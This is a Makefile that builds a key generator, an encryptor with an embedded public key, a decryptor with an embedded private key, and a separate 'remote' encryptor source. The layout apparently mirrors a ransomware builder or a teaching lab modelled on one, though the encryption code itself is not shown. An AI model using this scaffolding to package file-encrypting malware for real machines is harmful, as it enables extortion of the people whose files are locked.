# Makefile for keygen, encrypt, decrypt, and generating remote encrypt source

# Only prompt for initials if not running clean
ifneq ($(MAKECMDGOALS), clean)
    EXT := $(shell read -p "Enter your name or initials to personalize the encryption: " ext; echo $$ext)
endif

# Default target: prompt for initials if EXT is unset, then generate keys and compile all
all: keygen encrypt decrypt save

PUB_KEY_FILE = public_$(EXT).pem
PRIV_KEY_FILE = private_$(EXT).pem

# Key generation target
keygen: keygen.c
	gcc -Wall -Wextra -o keygen keygen.c -lssl -lcrypto
	chmod +x keygen
	@echo "Running keygen to create $(PUB_KEY_FILE) and $(PRIV_KEY_FILE)..."
	@./keygen $(EXT)

# Generate encrypt-has-key.c by inserting public key content specifically at the placeholder
encrypt-has-key.c: encrypt.c $(PUB_KEY_FILE)
	@echo "Embedding $(PUB_KEY_FILE) as PUB_KEY_BASE64 in encrypt-has-key.c..."
	@awk -v pubkeyfile="$(PUB_KEY_FILE)" '{ \
		if ($$0 == "#define PUB_KEY_BASE64 \"\"") { \
			printf("#define PUB_KEY_BASE64 \""); \
			while ((getline line < pubkeyfile) > 0) { \
				gsub(/\n/, "\\n", line); \
				printf "%s\\n", line; \
			} \
			close(pubkeyfile); \
			printf("\"\n"); \
		} else { \
			print $$0; \
		} \
	}' encrypt.c > encrypt-has-key.c
	@sed -i '' "s/\[EXT\]/$(EXT)/g" encrypt-has-key.c

# Generate decrypt-has-key.c by inserting private key content specifically at the placeholder
decrypt-has-key.c: decrypt.c $(PRIV_KEY_FILE)
	@echo "Embedding $(PRIV_KEY_FILE) as PRIV_KEY_BASE64 in decrypt-has-key.c..."
	@awk -v privkeyfile="$(PRIV_KEY_FILE)" '{ \
		if ($$0 == "#define PRIV_KEY_BASE64 \"\"") { \
			printf("#define PRIV_KEY_BASE64 \""); \
			while ((getline line < privkeyfile) > 0) { \
				gsub(/\n/, "\\n", line); \
				printf "%s\\n", line; \
			} \
			close(privkeyfile); \
			printf("\"\n"); \
		} else { \
			print $$0; \
		} \
	}' decrypt.c > decrypt-has-key.c
	@sed -i '' "s/\[EXT\]/$(EXT)/g" decrypt-has-key.c

# Compile encrypt binary using encrypt-has-key.c
encrypt: encrypt-has-key.c
	gcc -Wall -Wextra -lssl -lcrypto -o encrypt4_$(EXT) encrypt-has-key.c -DENCRYPTED_FILE_EXTENSION=\".$(EXT)\"
	chmod +x encrypt4_$(EXT)
	@echo "Building encrypt4_$(EXT) using embedded public key..."

# Compile decrypt binary using decrypt-has-key.c
decrypt: decrypt-has-key.c
	gcc -Wall -Wextra -lssl -lcrypto -o decrypt4_$(EXT) decrypt-has-key.c -DDECRYPTED_FILE_EXTENSION=\".$(EXT)\"
	chmod +x decrypt4_$(EXT)
	@echo "Building decrypt4_$(EXT) using embedded private key..."

# Create the remote version of the encryption source code and remove the embedded key versions
# Make a directory for the extension to save the files and move all the extension-specific files to that directory
save:
	cp encrypt-has-key.c encrypt4_$(EXT)_remote.c
	rm encrypt-has-key.c decrypt-has-key.c
	mkdir crypt-$(EXT)
	mv decrypt4_$(EXT) encrypt4_$(EXT) private_$(EXT).pem public_$(EXT).pem encrypt4_$(EXT)_remote.c ./crypt-$(EXT)

# Clean up generated files
clean:
	@echo "Removing all generated files"
	rm -f encrypt4_* decrypt4_* keygen encrypt-has-key.c decrypt-has-key.c private_*.pem public_*.pem

